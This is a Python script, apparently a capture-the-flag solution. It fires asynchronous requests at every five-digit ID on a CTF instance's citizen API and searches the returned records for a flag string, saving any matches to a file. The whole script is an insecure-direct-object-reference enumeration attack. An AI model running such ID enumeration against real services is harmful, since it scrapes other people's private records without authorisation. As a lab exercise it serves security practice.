import aiohttp
import asyncio
import json

URL = "http://instance.ctf.it.kmitl.ac.th:3624/api/citizen/"

async def check_id(session, cid):
    try:
        async with session.get(URL + str(cid), timeout=5) as r:
            if r.status == 200:
                data = await r.json()
                if data.get("notes") and "Cl@sh" in data["notes"]:
                    print(f"FOUND FLAG! ID={cid} | {data['notes']}")
                    return data
    except: pass
    return None

async def main():
    async with aiohttp.ClientSession() as session:
        # วนลูปเช็ค ID 5 หลัก (10000 - 99999)
        tasks = [check_id(session, i) for i in range(10000, 100000)]
        results = await asyncio.gather(*tasks)
        # กรองเฉพาะอันที่เจอข้อมูล
        found = [r for r in results if r]
        
        with open("flag_record.json", "w", encoding="utf-8") as f:
            json.dump(found, f, ensure_ascii=False, indent=2)

asyncio.run(main())
